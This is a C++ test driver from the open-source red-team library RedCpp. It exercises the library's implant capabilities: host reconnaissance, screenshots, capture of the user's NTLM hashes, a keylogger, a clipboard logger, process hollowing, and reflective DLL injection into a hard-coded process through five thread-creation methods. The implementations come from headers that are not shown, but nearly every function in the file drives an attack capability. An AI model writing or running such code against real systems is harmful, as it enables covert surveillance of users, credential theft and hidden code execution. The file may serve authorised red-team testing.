/*
* Author: Hegusung
* Github: https://github.com/hegusung/RedCpp
*/

#include <iostream>
#include <fstream>

#include "../lib/localhost.h"
#include "../lib/server.h"
#include "../lib/keylogger.h"
#include "../lib/clipboard.h"
#include "../lib/spawn.h"

void getSystemInfo()
{
	Localhost host = Localhost();

	SystemInfo* systeminfo = host.get_system_info();

	if (systeminfo != NULL)
	{
		printf("SystemInfo:\n");
		wprintf(L"OS Name: %s\n", systeminfo->os_name.c_str());
		wprintf(L"OS Arch: %s\n", systeminfo->os_arch.c_str());
		wprintf(L"Install date: %s\n", systeminfo->install_date.c_str());
		wprintf(L"Last boot date: %s\n", systeminfo->last_boot_date.c_str());
	}
	else
	{
		printf("Unable to get system info\n");
	}


	std::list<Application> apps = host.list_applications();

	printf("Applications:\n");
	for (std::list<Application>::iterator iterator = apps.begin(), end = apps.end(); iterator != end; ++iterator)
	{
		Application app = *iterator;

		printf(" - %s : %s\n", app.name.c_str(), app.version.c_str());
	}

	printf("RDP servers:\n");
	std::list<RDPServer> rdp_list = host.list_rdp_servers();
	for (std::list<RDPServer>::iterator iterator = rdp_list.begin(), end = rdp_list.end(); iterator != end; ++iterator)
	{
		RDPServer rdp = *iterator;

		printf(" - %s : %s\n", rdp.username.c_str(), rdp.server.c_str());
	}

}

void screenshot(const char* path)
{
	Localhost host = Localhost();

	vectByte screenshot = host.screenshot();

#pragma warning(suppress : 4996)
	FILE* f = fopen(path, "wb");

	fwrite((unsigned char*)&screenshot[0], 1, screenshot.size(), f);

	fclose(f);
}

void getSelfHash()
{
	std::string res;
	Hash* hash = DoAuthentication();

	if (hash != NULL)
	{
		printf("Username: %s\n", hash->username.c_str());
		printf("Computer: %s\n", hash->computer.c_str());

		if (hash->type == 1)
		{
			printf("Nonce: %s\n", hash->nonce.c_str());
			printf("LMHash: %s\n", hash->lmhash.c_str());
			printf("NTHash: %s\n", hash->nthash.c_str());
		}
		else if (hash->type == 2)
		{
			printf("Nonce: %s\n", hash->nonce.c_str());
			printf("Client Nonce: %s\n", hash->client_nonce.c_str());
			printf("NTHash: %s\n", hash->nthash.c_str());
		}

		delete hash;
	}
	else
		printf("Failed to retrieve hash\n");



}

void listProcesses()
{
	Localhost host = Localhost();

	std::list<Process> procs = host.list_processes();

	printf("Processes:\n");
	for (std::list<Process>::iterator iterator = procs.begin(), end = procs.end(); iterator != end; ++iterator)
	{
		Process proc = *iterator;

		printf(" - [%d -> %d] %s (%s) (%s)\n", proc.parent_pid, proc.pid, proc.exe_name.c_str(), proc.exe_path.c_str(), proc.image_type.c_str());
	}
}

void test_keylogger()
{
	Keylogger keylogger = Keylogger();

	bool success = keylogger.start_keylogger();
	if (success)
	{
		printf("Successfully started the keylogger\n");
	}
	else
	{
		printf("Failed to start the keylogger\n");
	}

	printf("Sleeping for 10 seconds, type some keys\n");

	Sleep(10 * 1000);

	printf("Keys:\n");

	std::string keys = keylogger.get_logged_keys();
	printf("%s\n", keys.c_str());

	success = keylogger.stop_keylogger();
	if (success)
	{
		printf("Successfully stopped the keylogger\n");
	}
	else
	{
		printf("Failed to stop the keylogger\n");
	}


}

void test_clipboard_logger()
{
	ClipboardLogger clipboard_logger = ClipboardLogger();

	bool success = clipboard_logger.start_clipboard_logger();
	if (success)
	{
		printf("Successfully started the clipboard logger\n");
	}
	else
	{
		printf("Failed to start the clipboard logger\n");
	}

	printf("Sleeping for 10 seconds, set some clipboards\n");

	Sleep(10 * 1000);

	printf("Clipboards:\n");

	std::list<std::string> clipboards = clipboard_logger.get_logged_clipboards();
	for (std::list<std::string>::const_iterator iterator = clipboards.begin(), end = clipboards.end(); iterator != end; ++iterator) 
	{
		printf(" - %s\n", (*iterator).c_str());
	}

	success = clipboard_logger.stop_clipboard_logger();
	if (success)
	{
		printf("Successfully stopped the clipboard logger\n");
	}
	else
	{
		printf("Failed to stop the clipboard logger\n");
	}


}

void test_spawn()
{
	Spawn spawn = Spawn();

	/*
	// Spawn cmd.exe
	bool success = spawn.start_exe("C:\\Windows\\System32\\cmd.exe", "/C ipconfig");
	if (success)
	{
		printf("Successfully started cmd.exe\n");
	}
	else
	{
		printf("Failed to start cmd.exe: %d\n", GetLastError());
	}

	// Spawn msedge.exe with another parent pid
	success = spawn.start_exe("C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe", NULL, 77161); //25424
	if (success)
	{
		printf("Successfully started msedge.exe\n");
	}
	else
	{
		printf("Failed to start msedge.exe: %d\n", GetLastError());
	}
	*/

	// Spawn calc.exe in msedge.exe
	int length;
	char* buffer;
	std::ifstream is;

	/*
	is.open("C:\\Users\\guillaume\\Documents\\VisualStudio\\RedCpp\\x64\\Debug\\test_helloworld.exe", std::ios::binary);
	// get length of file:
	is.seekg(0, std::ios::end);
	length = is.tellg();
	is.seekg(0, std::ios::beg);
	// allocate memory:
	buffer = new char[length];
	// read data as a block:
	is.read(buffer, length);
	is.close();


	bool success = spawn.start_process_hollowing("C:\\Program Files\\BlueStacks\\Bluestacks.exe", buffer);
	if (success)
	{
		printf("Successfully process hollowed test_helloworld.exe in Bluestacks.exe\n");
	}
	else
	{
		printf("Failed to process hollowed test_helloworld.exe in Bluestacks.exe: %d\n", GetLastError());
	}
	*/

	printf("Reflective Injection : CreateRemoteThread\n");

	is.open("C:\\Users\\guillaume\\Documents\\VisualStudio\\RedCpp\\x64\\Debug\\reflective_dll.dll", std::ios::binary);
	// get length of file:
	is.seekg(0, std::ios::end);
	length = is.tellg();
	is.seekg(0, std::ios::beg);
	// allocate memory:
	buffer = new char[length];
	// read data as a block:
	is.read(buffer, length);
	is.close();

	bool success = spawn.reflective_injection_CreateRemoteThread(7992, buffer, length);
	if (success)
	{
		printf("Successfully injected into the process\n");
	}
	else
	{
		printf("Failed to inject in the process: %d\n", GetLastError());
	}

	printf("Reflective Injection : NtCreateThreadEx\n");

	is.open("C:\\Users\\guillaume\\Documents\\VisualStudio\\RedCpp\\x64\\Debug\\reflective_dll.dll", std::ios::binary);
	// get length of file:
	is.seekg(0, std::ios::end);
	length = is.tellg();
	is.seekg(0, std::ios::beg);
	// allocate memory:
	buffer = new char[length];
	// read data as a block:
	is.read(buffer, length);
	is.close();

	success = spawn.reflective_injection_NtCreateThreadEx(7992, buffer, length);
	if (success)
	{
		printf("Successfully injected into the process\n");
	}
	else
	{
		printf("Failed to inject in the process: %d\n", GetLastError());
	}

	printf("Reflective Injection : pfnRtlCreateUserThread\n");

	is.open("C:\\Users\\guillaume\\Documents\\VisualStudio\\RedCpp\\x64\\Debug\\reflective_dll.dll", std::ios::binary);
	// get length of file:
	is.seekg(0, std::ios::end);
	length = is.tellg();
	is.seekg(0, std::ios::beg);
	// allocate memory:
	buffer = new char[length];
	// read data as a block:
	is.read(buffer, length);
	is.close();

	success = spawn.reflective_injection_pfnRtlCreateUserThread(7992, buffer, length);
	if (success)
	{
		printf("Successfully injected into the process\n");
	}
	else
	{
		printf("Failed to inject in the process: %d\n", GetLastError());
	}

	printf("Reflective Injection : QueueUserAPC\n");

	is.open("C:\\Users\\guillaume\\Documents\\VisualStudio\\RedCpp\\x64\\Debug\\reflective_dll.dll", std::ios::binary);
	// get length of file:
	is.seekg(0, std::ios::end);
	length = is.tellg();
	is.seekg(0, std::ios::beg);
	// allocate memory:
	buffer = new char[length];
	// read data as a block:
	is.read(buffer, length);
	is.close();

	success = spawn.reflective_injection_QueueUserAPC(7992, buffer, length);
	if (success)
	{
		printf("Successfully injected into the process\n");
	}
	else
	{
		printf("Failed to inject in the process: %d\n", GetLastError());
	}

	printf("Reflective Injection : SetThreadContext\n");

	is.open("C:\\Users\\guillaume\\Documents\\VisualStudio\\RedCpp\\x64\\Debug\\reflective_dll.dll", std::ios::binary);
	// get length of file:
	is.seekg(0, std::ios::end);
	length = is.tellg();
	is.seekg(0, std::ios::beg);
	// allocate memory:
	buffer = new char[length];
	// read data as a block:
	is.read(buffer, length);
	is.close();

	success = spawn.reflective_injection_SetThreadContext(7992, buffer, length);
	if (success)
	{
		printf("Successfully injected into the process\n");
	}
	else
	{
		printf("Failed to inject in the process: %d\n", GetLastError());
	}
}

int main()
{
	/*
	getSystemInfo();

	printf("\n==========================================\n\n");

	screenshot("screenshot.png");

	printf("\n==========================================\n\n");

	getSelfHash();

	printf("\n==========================================\n\n");
	*/
	listProcesses();
	/*
	printf("\n==========================================\n\n");

	test_keylogger();

	printf("\n==========================================\n\n");

	test_clipboard_logger();

	printf("\n==========================================\n\n");

	*/

	//test_spawn();

	Sleep(10 * 1000);
}

int WINAPI WinMain(HINSTANCE hinstance, HINSTANCE hPrevInstance,
	LPSTR lpCmdLine, int nCmdShow)
{
	main();
}